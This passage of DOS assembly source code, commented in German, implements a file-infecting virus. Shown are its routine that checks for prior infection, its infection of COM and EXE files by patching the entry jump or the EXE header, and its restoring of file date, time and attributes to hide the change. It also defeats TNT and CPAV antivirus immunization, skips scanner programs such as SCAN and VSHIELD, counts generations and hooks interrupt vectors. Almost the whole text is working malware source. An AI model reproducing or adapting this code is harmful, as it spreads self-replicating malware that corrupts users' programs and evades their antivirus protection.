          JNC HANDLE                    ;OK --> HANDLE
          JMP BREAK                     ;FEHLER --> BREAK

HANDLE:   MOV BX,AX                     ;Handle in <BX> retten
;------------------------------------------------------------------------------
          PUSH CS                       ;Nebenbei...
          POP DS                        ;...<DS> auf <CS> setzen

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� ID_WORD TESTEN (Keine Doppelinfektion!):                                   �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
ID_TEST:  MOV AX,4202H                  ;Dateizeiger bewegen, relativ zum Ende
          MOV CX,0FFFFH                 ;HI-WORD des Offset
          MOV DX,(-5)                   ;LO-WORD des Offset
          CALL GODOS                    ;Handle in <BX>
          JNC ID_OK                     ;OK --> Weiter
N_CLOSE:  JMP CLOSE                     ;FEHLER -->  CLOSE

ID_OK:    MOV AH,3FH                    ;Datei lesen
          MOV CX,2                      ;Anzahl zu lesender BYTES
          MOV DX,OFFSET PUFFER-FAKTOR   ;OFS des Puffers, SEG in <DS>
          CALL GODOS                    ;Handle in <BX>
          JC N_CLOSE                    ;FEHLER --> CLOSE

          CMP WORD PTR CS:[OFFSET PUFFER-FAKTOR],ID_WORD    ;Kennbytes..?
          JZ N_CLOSE                                        ;JA --> CLOSE

          MOV BYTE PTR CS:[OFFSET IMMUN-FAKTOR],0           ;IMMUN-Flag l�schen
          CMP WORD PTR CS:[OFFSET PUFFER-FAKTOR],TNT_WORD   ;Immunisiert..?
          JNZ READ_IT                                       ;JA --> READ_IT
          MOV BYTE PTR CS:[OFFSET IMMUN-FAKTOR],1           ;Immunisiert...

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Ersten 18H BYTEs des Hosts merken:                                         �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
READ_IT:  CALL SEEK_BEG                 ;Dateizeiger auf den Anfang der Datei
          JC N_CLOSE                    ;FEHLER --> CLOSE

          MOV AH,3FH                    ;Datei lesen
          MOV CX,18H                    ;Anzahl zu lesender BYTES
          MOV DX,OFFSET PUFFER-FAKTOR   ;OFS des Puffers, SEG in <DS>
          CALL GODOS                    ;Handle in <BX>
          JC N_CLOSE                    ;FEHLER --> CLOSE

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� L�nge einlesen und merken:                                                 �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AX,4202H                  ;Dateizeiger bewegen, relativ zum Ende
          XOR CX,CX                     ;HI-WORD des Offset
          XOR DX,DX                     ;LO-WORD des offset
          CALL GODOS                    ;Handle in <BX>
          JC N_CLOSE                    ;FEHLER --> CLOSE

          MOV SI,AX                     ;LO-WORD der Dateil�nge in <SI> merken
          MOV DI,DX                     ;HI-WORD der Dateil�nge in <DI> merken

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Dateizeiger auf den Anfang des Hosts:                                      �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CALL SEEK_BEG                 ;Dateizeiger auf den Anfang der Datei
          JC N_CLOSE                    ;FEHLER --> N_CLOSE --> CLOSE

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Altes DATUM und alte ZEIT merken:                                          �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AX,5700H                  ;Lezte Modifikation der Datei merken
          CALL GODOS                    ;Handle in <BX>
          JC N_CLOSE                    ;FEHLER --> CLOSE

          PUSH CX                       ;Uhrzeit merken
          PUSH DX                       ;Datum merken

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� COM oder EXE..????                                                         �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CMP WORD PTR CS:[OFFSET PUFFER-FAKTOR],"ZM"   ;EXE-Datei? ("MZ")
          JZ GO_EXE                                     ;JA --> GO_EXE

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� COM:                                                                       �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CMP SI,MAXGR                  ;Datei zu gro�?
          JAE POP_CLOSE                 ;JA --> CLOSE

          MOV CS:[COMEXE-FAKTOR],0      ;COMEXE auf COM setzen

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� COM: R�cksprung & JMP setzen                                               �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
;------------------------------------------------------------------------------
; OFS des R�cksprungs in den Host (100H) setzen, SEG wird w�hrend der Laufzeit
; eingesetzt... (<CS> ist je nach freiem Speicher immer unterschiedlich!)
;------------------------------------------------------------------------------
          MOV WORD PTR CS:[OFFSET HOST_OFS-FAKTOR],100H

;------------------------------------------------------------------------------
; Sprung vom HOST in den VIRUS setzen und an den Anfang der Datei schreiben:
;------------------------------------------------------------------------------
          MOV BYTE PTR CS:[OFFSET PUFFER-FAKTOR+3],0E9H ;JMP setzen
          SUB SI,3                      ;JMP und Dateil�nge anpassen
          MOV WORD PTR CS:[OFFSET PUFFER-FAKTOR+4],SI   ;Offset setzen

          MOV AH,40H                    ;Datei beschreiben
          MOV CX,3                      ;Anzahl zu schreibender Bytes
          MOV DX,OFFSET PUFFER-FAKTOR+3 ;OFS des Puffers
          CALL GODOS                    ;Handle in <BX>
          JNC F_INFECT                  ;--> F_INFECT -->
F_MODIFY: JMP MODIFY                    ;FEHLER --> SCHLIESSEN
F_INFECT: XOR DI,DI                     ;LO-OFS des FilePtr in <DI> (s.u.)
          JMP INFECT                    ; --> INFECT !!!

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� EXE:                                                                       �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
GO_EXE:   MOV BYTE PTR CS:[COMEXE-FAKTOR],1       ;COMEXE auf EXE setzen

;------------------------------------------------------------------------------
; Dateil�nge im EXE-Kopf (in Seiten zu 512 Bytes) in BYTEs wandeln und in <AX>
; (LO-WORD) und <DX> (HI-WORD) speichern ( ---> um die EXE-Dateil�nge im EXE-
; Kopf mit der oben ermittelten physikalischen Dateil�nge vergleichen zu k�n-
; nen !!!):
;------------------------------------------------------------------------------
          MOV AX,WORD PTR CS:[OFFSET PUFFER+4-FAKTOR] ;F_L�nge (in Seiten zu...
          DEC AX                        ;...512 BYTEs) in <AX>
          MOV CX,512                    ;Mit 512 malnehmen, und...
          MUL CX                        ;...somit in BYTEs wandeln
          ADD AX,WORD PTR CS:[OFFSET PUFFER+2-FAKTOR] ;BYTEs der letzten Seite drauf
          JNC EXE_TEST                  ;�BERTRAG? NEIN --> EXE_TEST
          INC DX                        ;JA --> HI-WORD der Dateigr��e erh�hen

;------------------------------------------------------------------------------
; Physikalische Dateil�nge (<SI>: LO-WORD / <DI>: HI-WORD) mit der Dateil�nge
; im EXE-Kopf (<AX>: LO-WORD / <DX>: HI-WORD) vergleichen, somit auf Overlays
; in der EXE-Datei testen:
;------------------------------------------------------------------------------
EXE_TEST: CMP AX,SI           ;LO-WORD im EXE-Kopf=LO-WORD der Dateigr��e?
          JNE POP_CLOSE       ;NEIN --> CLOSE
          CMP DX,DI           ;HI-WORD im EXE-Kopf=HI-WORD der Dateigr��e?
          JE SET_EXE          ;JA --> SET_EXE
POP_CLOSE:POP AX              ;Datum wird nicht mehr gebraucht (vom Stack)
          POP BP              ;(s.o...)
          JMP CLOSE           ;NEIN --> CLOSE

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� EXE: R�cksprung & JMP setzen                                               �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
;==============================================================================
; EXE-Datei IST TAUGLICH! Neues <CS> und neuen <IP> vorbereiten, altes <CS> und
; <IP> (AUS DEM EXE-Kopf) f�r den R�cksprung vorbereiten:
;==============================================================================
;------------------------------------------------------------------------------
; Dateil�nge in Paras wandeln:
;------------------------------------------------------------------------------
SET_EXE:  MOV AX,SI                     ;LO-WORD der L�nge in <AX> sichern
          MOV DX,DI                     ;HI-WORD der L�nge in <DX> sichern

          MOV CL,4                      ;LOW-WORD der Dateil�nge...
          SHR AX,CL                     ;...in PARAs wandeln
          MOV CL,12                     ;Unteren 4 BITs des HI-WORD der Datei-
          SHL DX,CL                     ;...l�nge in oberen 4 BITs verschieben
          OR AX,DX                      ;Beides verkn�pfen: Dateil�nge in PARAs

;------------------------------------------------------------------------------
; EXE-File auf VOLLE Paragraphenl�nge testen, falls noch BYTEs zum vollen Para-
; graphen ben�tigt werden, wird dies in <DI> gemerkt und das neue <CS> um einen
; Para erh�ht (Virus beginnt immer am Paragraphenstart!!!):
;------------------------------------------------------------------------------
          AND SI,01111B       ;Alles bis auf die unteren 4 BITs ausmaskieren
          MOV DI,10000B       ;Wieviel bleibt zu einem PARA �brig...
          SUB DI,SI           ;...in <DI> merken
          AND DI,01111B       ;Alles bis auf die unteren 4 BITs ausmaskieren
          JZ NEU_KOPF         ;PARA ist schon voll --> NEU_KOPF
          INC AX              ;Neues <CS> um einen PARA erh�hen

;------------------------------------------------------------------------------
; EXE-Kopfl�nge abziehen, und somit neues <CS> in <AX>:
;------------------------------------------------------------------------------
NEU_KOPF: SUB AX,WORD PTR CS:[OFFSET PUFFER+8-FAKTOR] ;Dateil�nge MINUS Kopf

;------------------------------------------------------------------------------
; R�cksprung vorbereiten, Differenz zwischen neuem <CS> und altem <CS>:
;------------------------------------------------------------------------------
          MOV CX,AX                               ;Neues <CS> in <CX> sichern
          MOV DX,WORD PTR CS:[OFFSET PUFFER+16H-FAKTOR]  ;Altes <CS> in <DX>
          SUB CX,DX                               ;Unterschied zw. Neu und Alt
          MOV WORD PTR CS:[OFFSET EXE_SEG+1-FAKTOR],CX   ;R�cksprung vorbereiten (SEG)

;------------------------------------------------------------------------------
; Neuen EXE-Start setzen, alten <IP> in den R�cksprungpuffer schieben:
;------------------------------------------------------------------------------
          MOV CX,WORD PTR CS:[OFFSET PUFFER+14H-FAKTOR]  ;Altes <IP> in <CX>
          MOV WORD PTR CS:[OFFSET HOST_OFS-FAKTOR],CX    ;R�cksprung vorbereiten (OFS)

;------------------------------------------------------------------------------
; Neues <CS> im EXE-Kopf eintragen, neuen <IP> im EXE-Kopf auf null setzten:
;------------------------------------------------------------------------------
          MOV WORD PTR CS:[OFFSET PUFFER+16H-FAKTOR],AX  ;Neues <CS>
          MOV WORD PTR CS:[OFFSET PUFFER+14H-FAKTOR],0   ;Neuer <IP>

;------------------------------------------------------------------------------
; EXE-Dateil�nge anpassen (Anzahl BYTEs in der letzten Seite um {ANZBYTES} er-
; h�hen und beim �berlauf �ber 512 BYTEs das 512-BYTE-pro-Seite Word um eins
; erh�hen) :
;------------------------------------------------------------------------------
          MOV AX,WORD PTR CS:[OFFSET PUFFER+2-FAKTOR] ;Anzahl BYTEs der letzten Seite
          ADD AX,DI                               ;BYTEs des letzten PARAs dazu...
          ADD AX,ANZBYTES                         ;...Virusl�nge dazu
          MOV DX,AX                               ;Diesen Wert in <DX> merken!

          AND AX,0111111111B            ;Unteren 9 BITs=512 NICHT ausmaskieren
          JNZ EXE_ZERO                  ;Sonderfall? NEIN --> EXE_ZERO
          MOV AX,512                    ;Letzte Seite=Voll
          SUB DX,512                    ;Anzahl Seiten weniger 1

EXE_ZERO: MOV WORD PTR CS:[OFFSET PUFFER+2-FAKTOR],AX ;BYTEs der letzten Seite
          MOV CL,9                      ;Den Rest in Seiten zu jeweils...
          SHR DX,CL                     ;...512 BYTEs umrechnen (shiften)

          ADD WORD PTR CS:[OFFSET PUFFER+4-FAKTOR],DX ;Auf die urspr�ngliche L�nge drauf!

;------------------------------------------------------------------------------
; Stack-SEG <SS> um {ANZBYTES/10H) Paragraphen nach hinten versetzen:
;------------------------------------------------------------------------------
          ADD WORD PTR CS:[OFFSET PUFFER+0EH-FAKTOR],(ANZBYTES/10H)  ;<SS> nach hinten

;==============================================================================
;EXE-Kopf erfolgreich modifiziert! Diesen Kopf jetzt in die Datei schreiben:
;==============================================================================
          MOV AH,40H                    ;Datei beschreiben
          MOV CX,18H                    ;Anzahl zu schreibender Bytes
          MOV DX,OFFSET PUFFER-FAKTOR   ;OFS des Puffers
          CALL GODOS                    ;Handle in <BX>
          JC MODIFY                     ;FEHLER --> SCHLIESSEN

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� TNT und CPAV �berlisten:                                                   �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
INFECT:   CMP BYTE PTR CS:[OFFSET IMMUN-FAKTOR],0 ;Immunisiert?
          JZ INF_CONT                             ;NEIN --> INF_CONT

          MOV AX,4202H                  ;Dateizeiger relativ zum Ende bewegen
          MOV CX,0FFFFH                 ;HI-WORD des FilePtr
          MOV DX,(-172H)                ;LO-WORD des FilePtr
          CALL GODOS                    ;Handle in <BX>

          MOV AH,3FH                    ;Datei lesen
          MOV CX,20H                    ;Anzahl zu lesender BYTES
          MOV DX,OFFSET VIR_END-FAKTOR  ;OFS des Puffers, SEG in <DS>
          CALL GODOS                    ;Handle in <BX>

;------------------------------------------------------------------------------
IMUN_TST: MOV SI,CX                     ;Anzahl zu lesender BYTEs in <SI>
          DEC SI                        ;NULL als Zahl interpretieren!
          CMP WORD PTR CS:[OFFSET VIR_END-FAKTOR+SI],09B4H ;Target gefunden?
          JZ BREAK_IT                   ;JA --> BREAK_IT
          LOOP IMUN_TST                 ;NEIN --> IMUN_TST
          JMP INF_CONT                  ;NIX...INF_CONT!

;------------------------------------------------------------------------------
BREAK_IT: MOV AX,4202H                  ;Dateizeiger relativ zum Ende bewegen
          MOV DX,172H                   ;LO-WORD des FilePtr
          SUB DX,SI                     ;Target-Position abziehen
          NEG DX                        ;Negieren (FilePtr r�ckw�rts!)
          MOV CX,0FFFFH                 ;HI-WORD des FilePtr
          CALL GODOS                    ;Handle in <BX>

          MOV AH,40H                    ;Datei beschreiben
          MOV CX,2                      ;Anzahl zu schreibender Bytes
          MOV DX,OFFSET ANTI_IMUN-FAKTOR ;OFS des Puffers
          CALL GODOS                    ;Handle in <BX>

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� FielPtr "SPACEN" (fr�her: F�ll-BYTEs schreiben):                           �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
INF_CONT: MOV AX,4202H                  ;Dateizeiger relativ zum Ende bewegen
          XOR CX,CX                     ;HI-WORD des FilePtr
          MOV DX,DI                     ;LO-WORD des FilePtr (F�ll-BYTEs...
          CALL GODOS                    ;... in <DI>), Handle in <BX>

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Generationsz�hler erh�hen:                                                 �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          INC WORD PTR CS:[OFFSET KOPIE-FAKTOR]   ;LO-Z�hler erh�hen
          JNZ GO_COPY                             ;Kein �berlauf --> ENDE
          INC WORD PTR CS:[OFFSET KOPIE-FAKTOR+2] ;HI-Z�hler erh�hen

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� KOPIEREN:                                                                  �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
GO_COPY:  MOV AH,40H                    ;Datei beschreiben
          MOV CX,ANZBYTES               ;Anzahl zu schreibender Bytes
          XOR DX,DX                     ;OFS des Puffers
          CALL GODOS                    ;Handle in <BX>

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Altes DATUM und alte ZEIT NEU setzen:                                      �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
MODIFY:   MOV AX,5701H                  ;Datum und Zeit der Datei restaurieren
          POP DX                        ;Altes Datum holen
          POP CX                        ;Alte Uhrzeit holen
          CALL GODOS                    ;Handle in <BX>

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Datei schlie�en:                                                           �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
CLOSE:    MOV AH,3EH                    ;Datei schliessen
          CALL GODOS                    ;Hoffentlich Ok...

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Attribut der Datei restaurieren                                            �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰

BREAK:    POP DS                        ;SEG des Dateinamens in <DS>...
          POP DX                        ;...OFS in <DX>
          POP CX                        ;Attribut in <CX>

          MOV AX,4301H                  ;Attribut einer Datei setzen
          CALL GODOS                    ;SEG in <DS> und OFS in <DX> (s.o.)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� INT 13H auf neuen (nach dem Virus) Vektor setzen:                          �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
REST_INT: POP DX                        ;OFS in <DX>
          POP DS                        ;SEG in <DS>
          MOV AX,2513H                  ;Vektor neu setzen
          CALL GODOS                    ;--> Dose direkt callen

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Kritikal Errorhandler wieder restaurieren:                                 �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          POP DX                        ;OFS in <DX>
          POP DS                        ;SEG in <DS>
          MOV AL,24H                    ;<AX>=24, Vektor neu setzen
          CALL GODOS                    ;--> Dose direkt callen

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� INT beenden...                                                             �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          JMP NEU21END                  ;INT Beenden --> NEU21END

NEU21     ENDP

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� Nicht zu infizierende Dateien:                                             �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
SCAN      DB "ASC"                      ;1: "SCAn"
          DB "ECL"                      ;2: "CLEan"
          DB "HVS"                      ;3: "VSHield"
          DB "RVI"                      ;4: "VIRus"
          DB "NWI"                      ;5: "WINdows"

ANZ_SCAN  EQU 5                         ;Anzahl eingegebener Viren

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� SEEK_BEG: Dateizeiger auf den Anfang der Datei setzen:                     �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
SEEK_BEG  PROC NEAR

          MOV AX,4200H                  ;Dateizeiger bew., relativ zum Anfang
          XOR CX,CX                     ;HI-WORD des Offset
          XOR DX,DX                     ;LO-WORD des offset
          CALL GODOS                    ;Handle in <BX>

          RET                           ; --> HOME

SEEK_BEG  ENDP

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� GODOS: Direkter Aufruf von INT 21H                                         �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
GODOS     PROC NEAR                     ;DOS-INT direkt aufrufen!!!

          PUSHF
          CALL DWORD PTR CS:[ALT21-FAKTOR]
          RET
                                        ;--> Is 17 BYTEs kleiner als die 
GODOS     ENDP                          ;Methode mit den Vektoren umbiegen..!

;==============================================================================
COMEXE    DB 0      ;COM oder EXE-File..?

ANTI_IMUN DB 0EBH,034H        ;Nix-Merken-JMP f�r CPAV und TNT

KOPIE     DD 1      ;     敖陳 Double-Word f�r die Anzahl der Generationen
;                                                    青陳陳朕
;浜様様様様様様様様様様様様様様様様様様様様様様様様�         �
;�           敖陳陳� DOUBLE-WORD 陳陳陳朕          �         
;�                                               �  Das Double-Word
;�     敖 LO-WORD 朕              敖 HI-WORD 朕    �  steht x Bytes VOR
;�                                             �  DEM ENDE des
;� LO-BYTE      HI-BYTE       LO-BYTE      HI-BITE �  infizierten Programms
;藩様様様様様様様様様様様様様様様様様様様様様様様様�

KENNUNG   DW ID_WORD          ;Kenn-WORD

PUFFER    DB  3 DUP(90H)      ;Puffer (EXE-Kopf, etc.), mit NOPs gef�llt (COM)

;==============================================================================
VIR_END   EQU $
;  
;  団� Ausgelagerter Puffer (20H BYTEs)
;  
BUF_END   EQU VIR_END+1FH
;------------------------------------------------------------------------------
ALT13     EQU BUF_END+1
;  
;  団� Alter Vektor von INT 13H
;  
ALT13_END EQU ALT13+3
;------------------------------------------------------------------------------
AKTIV     EQU ALT13_END+1
;  
;  団� Aktiv-Flag f�r den residenten Teil des Virus
;  
AKTIV_END EQU AKTIV
;------------------------------------------------------------------------------
IMMUN     EQU AKTIV+1         ;陳�> IMMER DER LETZT EINTRAG! (s. Virus-Kopf)
;  
;  青� Ist die Zieldatei immunisiert worden von TNT oder CPAV ?
;
;==============================================================================
CODE ENDS

END START
